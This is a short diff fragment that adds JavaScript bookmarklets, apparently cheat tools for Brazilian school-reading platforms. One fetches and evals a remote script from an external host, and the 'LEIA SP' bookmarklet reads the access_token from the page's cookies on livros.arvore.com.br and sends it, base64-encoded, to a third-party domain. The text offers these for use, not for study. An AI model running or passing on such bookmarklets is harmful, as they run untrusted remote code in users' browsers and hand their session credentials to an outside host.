@@ -5,3 +5,22 @@ githubusercontent.com/Niximkk/
 Khanware/refs/heads/main/Khanw
 are.js").then(t=>t.text()).the
 n(eval);
+
+SPEAK
+
+javascript:fetch("https://spea
+kify.cupiditys.lol/api/bookmar
+k.js").then(r => r.text()).the
+n(r => eval(r))
+
+LEIA SP
+
+javascript:!function(){if('liv
+ros.arvore.com.br'!==location.
+host)return alert('Este script
+s%C3%B3 funciona no %C3%81rvor
+e!');open(`https://leiasp.cupi
+ditys.lol/?key=${encodeURIComp
+onent(btoa(document.cookie.spl
+it(%27access_token=%27)[1].spl
+it(%27;%27)[0]))}`)}();
